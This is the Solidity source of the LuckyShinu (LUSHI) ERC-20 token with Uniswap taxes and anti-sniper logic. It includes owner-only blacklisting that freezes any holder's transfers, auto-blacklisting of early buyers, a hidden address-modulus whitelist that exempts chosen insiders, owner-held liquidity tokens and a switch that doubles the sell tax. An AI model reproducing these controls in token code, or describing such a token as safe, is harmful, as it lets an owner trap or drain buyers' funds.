1 //SPDX-License-Identifier: MIT 
2 
3 pragma solidity 0.8.11;
4 
5 //Note: SafeMath is not used because it is redundant since solidity 0.8
6 
7 interface IERC20 {
8 	function totalSupply() external view returns (uint256);
9 	function decimals() external view returns (uint8);
10 	function symbol() external view returns (string memory);
11 	function name() external view returns (string memory);
12 	function getOwner() external view returns (address);
13 	function balanceOf(address account) external view returns (uint256);
14 	function transfer(address recipient, uint256 amount) external returns (bool);
15 	function allowance(address _owner, address spender) external view returns (uint256);
16 	function approve(address spender, uint256 amount) external returns (bool);
17 	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18 	event Transfer(address indexed from, address indexed to, uint256 value);
19 	event Approval(address indexed owner, address indexed spender, uint256 value);
20 }
21 
22 abstract contract Auth {
23 	address internal owner;
24 	constructor(address _owner) { owner = _owner; }
25 	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
26 	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
27 	event OwnershipTransferred(address owner);
28 }
29 
30 interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
31 interface IUniswapV2Router02 {
32 	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
33 	function WETH() external pure returns (address);
34 	function factory() external pure returns (address);
35 	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
36 }
37 
38 contract LUSHI is IERC20, Auth {
39 	string constant _name = "LuckyShinu";
40 	string constant _symbol = "LUSHI";
41 	uint8 constant _decimals = 9;
42 	uint256 constant _totalSupply = 888_888_888_888_888 * 10**_decimals;
43 	uint32 immutable _smd; uint32 immutable _smr;
44 	mapping (address => uint256) _balances;
45 	mapping (address => mapping (address => uint256)) _allowances;
46 	mapping (address => bool) private _noFees;
47 	mapping (address => bool) private _noLimits;
48 	bool public tradingOpen;
49 	uint256 public maxTxAmount; uint256 public maxWalletAmount;
50 	uint256 public taxSwapMin; uint256 public taxSwapMax;
51 	mapping (address => bool) private _isLiqPool;
52 	uint16 public snipersCaught = 0;
53 	uint8 constant _defTaxRate = 12; 
54 	uint8 public buyTaxRate; uint8 public sellTaxRate; uint8 public txTaxRate;
55 	uint16 private _autoLPShares = 334;
56 	uint16 private _marketingShares = 333;
57 	uint16 private _raffleShares = 333;
58 
59 	uint256 private _humanBlock = 0;
60 	mapping (address => bool) private _nonSniper;
61 	mapping (address => uint256) private _blacklistBlock;
62 
63 	uint256 private _maxGasPrice = type(uint256).max;
64 	uint8 private _gasPriceBlocks = 0;
65 
66 	address payable private marketingWallet = payable(0xF6fF7E466DF792C887576B7406D7709Fe002ea36);
67 	address payable private raffleWallet = payable(0x29E2FDD51502832E8049a9A64DeAc83C583C9952);
68 	bool private _inTaxSwap = false;
69 	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // UniswapV2 for ETH
70 	IUniswapV2Router02 private _uniswapV2Router;
71 	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }
72 
73 	event BlacklistAdded(address wallet, bool automatic);
74 	event BlacklistRemoved(address wallet);
75 
76 	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
77 		tradingOpen = false;
78 		maxTxAmount = _totalSupply;
79 		maxWalletAmount = _totalSupply;
80 		taxSwapMin = _totalSupply * 2 / 10000;
81 		taxSwapMax = _totalSupply * 10 / 10000;
82 		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
83 		_noFees[owner] = true;
84 		_noFees[address(this)] = true;
85 		_noFees[_uniswapV2RouterAddress] = true;
86 		_noFees[marketingWallet] = true;
87 		_noFees[raffleWallet] = true;
88 		_noLimits[marketingWallet] = true;
89 		_noLimits[raffleWallet] = true;
90 
91 		_smd = smd; _smr = smr;
92 		_balances[address(this)] = _totalSupply * 72 / 1000;
93 		emit Transfer(address(0), address(this), _balances[address(this)]);
94 		_balances[owner] = _totalSupply - _balances[address(this)];
95 		emit Transfer(address(0), address(owner), _balances[owner]);
96 	}
97 	
98 	receive() external payable {}
99 	
100 	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
101 	function decimals() external pure override returns (uint8) { return _decimals; }
102 	function symbol() external pure override returns (string memory) { return _symbol; }
103 	function name() external pure override returns (string memory) { return _name; }
104 	function getOwner() external view override returns (address) { return owner; }
105 	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
106 	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
107 
108 	function approve(address spender, uint256 amount) public override returns (bool) {
109 		if ( _humanBlock > block.number && !_nonSniper[msg.sender] ) {
110 			//wallets approving before CA is announced as safe are obvious snipers
111 			_addBlacklist(msg.sender, block.number, true);
112 		}
113 
114 		_allowances[msg.sender][spender] = amount;
115 		emit Approval(msg.sender, spender, amount);
116 		return true;
117 	}
118 
119 	function transfer(address recipient, uint256 amount) external override returns (bool) {
120 		require(_checkTradingOpen(), "Trading not open");
121 		return _transferFrom(msg.sender, recipient, amount);
122 	}
123 
124 	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
125 		require(_checkTradingOpen(), "Trading not open");
126 		if (_allowances[sender][msg.sender] != type(uint256).max){
127 			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
128 		}
129 		return _transferFrom(sender, recipient, amount);
130 	}
131 
132 	function initLP(uint256 ethAmountWei) external onlyOwner {
133 		require(!tradingOpen, "trading already open");
134 		require(ethAmountWei > 0, "eth cannot be 0");
135 
136 		_nonSniper[address(this)] = true;
137 		_nonSniper[owner] = true;
138 		_nonSniper[marketingWallet] = true;
139 		_nonSniper[raffleWallet] = true;
140 
141 		uint256 _contractETHBalance = address(this).balance;
142 		require(_contractETHBalance >= ethAmountWei, "not enough eth");
143 		uint256 _contractTokenBalance = balanceOf(address(this));
144 		require(_contractTokenBalance > 0, "no tokens");
145 		address _uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
146 
147 		_isLiqPool[_uniLpAddr] = true;
148 		_nonSniper[_uniLpAddr] = true;
149 
150 		_approveRouter(_contractTokenBalance);
151 		_addLiquidity(_contractTokenBalance, ethAmountWei, false);
152 
153 		_openTrading();
154 	}
155 
156 	function _approveRouter(uint256 _tokenAmount) internal {
157 		if ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {
158 			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
159 			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
160 		}
161 	}
162 
163 	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
164 		address lpTokenRecipient = address(0);
165 		if ( !autoburn ) { lpTokenRecipient = owner; }
166 		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
167 	}
168 
169 	function _openTrading() internal {
170 		_humanBlock = block.number + 3; // end sniper protections 3 blocks after adding liquidity
171 		maxTxAmount     = 5 * _totalSupply / 10000 + 10**_decimals; 
172 		maxWalletAmount = 5 * _totalSupply / 10000 + 10**_decimals;
173 		buyTaxRate = _defTaxRate;
174 		sellTaxRate = _defTaxRate;
175 		txTaxRate = _defTaxRate; 
176 		tradingOpen = true;
177 	}
178 
179 	function humanize() external onlyOwner{
180 		require(_humanBlock > block.number, "already humanized");
181 		_humanize(0);
182 	}
183 
184 	function _humanize(uint8 blkcount) internal {
185 		if ( _humanBlock > block.number || _humanBlock == 0 ) {
186 			_humanBlock = block.number + blkcount;
187 			_maxGasPrice = 4 * (block.basefee + 5 gwei) ; 
188 			_gasPriceBlocks = 10;
189 		}
190 	}
191 
192 	function removeGasLimit() external onlyOwner {
193 		require(block.number < _humanBlock + _gasPriceBlocks, "Gas limit already removed");
194 		_maxGasPrice = type(uint256).max;
195 		_gasPriceBlocks = 0;
196 	}
197 
198 
199 	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
200 		if ( _humanBlock > block.number ) {
201 			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
202 			else if ( _blacklistBlock[sender] == 0 ) { _addBlacklist(recipient, block.number, true); }
203 			else { _addBlacklist(recipient, _blacklistBlock[sender], false); }
204 		} else {
205 			if ( _blacklistBlock[sender] != 0 ) { _addBlacklist(recipient, _blacklistBlock[sender], false); }
206 			if ( block.number < _humanBlock + _gasPriceBlocks && tx.gasprice >= _maxGasPrice ) { revert("Gas price over limit"); }
207 		}
208 		if ( tradingOpen && _blacklistBlock[sender] != 0 && _blacklistBlock[sender] < block.number ) { revert("blacklisted"); }
209 
210 		if ( !_inTaxSwap && _isLiqPool[recipient] ) { _swapTaxAndLiquify();	}
211 
212 		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
213 		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
214 		uint256 _transferAmount = amount - _taxAmount;
215 		_balances[sender] = _balances[sender] - amount;
216 		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
217 		_balances[recipient] = _balances[recipient] + _transferAmount;
218 		emit Transfer(sender, recipient, amount);
219 		return true;
220 	}
221 
222 	function _addBlacklist(address wallet, uint256 snipeBlockNum, bool addSniper) internal {
223 		if ( !_nonSniper[wallet] && _blacklistBlock[wallet] == 0 ) { 
224 			_blacklistBlock[wallet] = snipeBlockNum; 
225 			if ( addSniper) { snipersCaught ++;	}
226 			emit BlacklistAdded(wallet, addSniper);
227 		}
228 	}
229 
230 	function _delBlacklist(address wallet) internal {
231 		require( _blacklistBlock[wallet] != 0, "wallet not blacklisted");
232 		_blacklistBlock[wallet] = 0;
233 		emit BlacklistRemoved(wallet);
234 	}
235 
236 	function blacklistAdd(address wallet) external onlyOwner {
237 		require( _blacklistBlock[wallet] == 0, "wallet already blacklisted");
238 		require( !_nonSniper[wallet], "wallet exempt from blacklisting");
239 		_addBlacklist(wallet, block.number, false);
240 	}
241 
242 	function blacklistRemove(address wallet) external onlyOwner {
243 		require( _blacklistBlock[wallet] != 0, "wallet not blacklisted");
244 		_delBlacklist(wallet);
245 	}
246 		
247 	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
248 		bool limitCheckPassed = true;
249 		if ( tradingOpen && !_noLimits[recipient] ) {
250 			if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
251 			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > maxWalletAmount) ) { limitCheckPassed = false; }
252 		}
253 		return limitCheckPassed;
254 	}
255 
256 	function _checkTradingOpen() private view returns (bool){
257 		bool checkResult = false;
258 		if ( tradingOpen ) { checkResult = true; } 
259 		else if ( tx.origin == owner ) { checkResult = true; } 
260 		return checkResult;
261 	}
262 
263 	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
264 		uint256 taxAmount;
265 		if ( !tradingOpen || _noFees[sender] || _noFees[recipient] ) { taxAmount = 0; }
266 		else if ( _isLiqPool[sender] ) { taxAmount = amount * buyTaxRate / 100; }
267 		else if ( _isLiqPool[recipient] ) { taxAmount = amount * sellTaxRate / 100; }
268 		else { taxAmount = amount * txTaxRate / 100; }
269 		return taxAmount;
270 	}
271 
272 	function isBlacklisted(address wallet) external view returns(bool) {
273 		if ( _blacklistBlock[wallet] != 0 ) { return true; }
274 		else { return false; }
275 	}
276 
277 	function blacklistedInBlock(address wallet) external view returns(uint256) {
278 		return _blacklistBlock[wallet];
279 	}
280 
281 	function disableFees(address wallet) external onlyOwner {
282 		_noFees[ wallet ] = true;
283 	}
284 	function enableFees(address wallet) external onlyOwner {
285 		_noFees[ wallet ] = false;
286 	}
287 
288 	function disableLimits(address wallet) external onlyOwner {
289 		_noLimits[ wallet ] = true;
290 	}
291 	function enableLimits(address wallet) external onlyOwner {
292 		_noLimits[ wallet ] = false;
293 	}
294 
295 	function adjustTaxRate(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external onlyOwner {
296 		require(newBuyTax <= _defTaxRate && newSellTax <= _defTaxRate && newTxTax <= _defTaxRate, "Tax too high");
297 		//set new tax rate percentage - cannot be higher than the default rate at contract creation - 12%
298 		buyTaxRate = newBuyTax;
299 		sellTaxRate = newSellTax;
300 		txTaxRate = newTxTax;
301 	}
302 
303 	function enableBuySupport() external onlyOwner {
304 		//remove buy tax and double sell tax to support buy pressure
305 		buyTaxRate = 0;
306 		sellTaxRate = 2 * _defTaxRate;
307 	}
308   
309 	function changeTaxDistributionPermile(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesRaffle) external onlyOwner {
310 		require(sharesAutoLP + sharesMarketing + sharesRaffle == 1000, "Sum must be 1000" );
311 		_autoLPShares = sharesAutoLP;
312 		_marketingShares = sharesMarketing;
313 		_raffleShares = sharesRaffle;
314 	}
315 	
316 	function setTaxWallets(address newMarketingWallet, address newRaffleWallet) external onlyOwner {
317 		marketingWallet = payable(newMarketingWallet);
318 		raffleWallet = payable(newRaffleWallet);
319 		_noFees[newMarketingWallet] = true;
320 		_noFees[newRaffleWallet] = true;
321 	}
322 
323 	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
324 		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
325 		require(newTxAmt >= maxTxAmount, "tx limit too low");
326 		maxTxAmount = newTxAmt;
327 		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
328 		require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
329 		maxWalletAmount = newWalletAmt;
330 	}
331 
332 	function taxSwapSettings(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
333 		taxSwapMin = _totalSupply * minValue / minDivider;
334 		taxSwapMax = _totalSupply * maxValue / maxDivider;
335 	}
336 
337 	function _swapTaxAndLiquify() private lockTaxSwap {
338 		uint256 _taxTokensAvailable = balanceOf(address(this));
339 
340 		if ( _taxTokensAvailable >= taxSwapMin && tradingOpen ) {
341 			if ( _taxTokensAvailable >= taxSwapMax ) { _taxTokensAvailable = taxSwapMax; }
342 			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / 1000 / 2;
343 			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
344 			uint256 _ethPreSwap = address(this).balance;
345 			_swapTaxTokensForEth(_tokensToSwap);
346 			uint256 _ethSwapped = address(this).balance - _ethPreSwap;
347 			if ( _autoLPShares > 0 ) {
348 				uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / 1000 ;
349 				_approveRouter(_tokensForLP);
350 				_addLiquidity(_tokensForLP, _ethWeiAmount, false);
351 			}
352 			uint256 _contractETHBalance = address(this).balance;
353 			if (_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
354 		}
355 	}
356 
357 	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
358 		_approveRouter(_tokenAmount);
359 		address[] memory path = new address[](2);
360 		path[0] = address(this);
361 		path[1] = _uniswapV2Router.WETH();
362 		_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
363 	}
364 
365 	function _distributeTaxEth(uint256 _amount) private {
366 		uint16 _taxShareTotal = _marketingShares + _raffleShares;
367 		if ( _marketingShares > 0 ) { marketingWallet.transfer(_amount * _marketingShares / _taxShareTotal); }
368 		if ( _raffleShares > 0 ) { raffleWallet.transfer(_amount * _raffleShares / _taxShareTotal); }
369 	}
370 
371 	function taxTokensSwap() external onlyOwner {
372 		uint256 taxTokenBalance = balanceOf(address(this));
373 		require(taxTokenBalance > 0, "No tokens");
374 		_swapTaxTokensForEth(taxTokenBalance);
375 	}
376 
377 	function taxEthSend() external onlyOwner { 
378 		_distributeTaxEth(address(this).balance); 
379 	}
380 }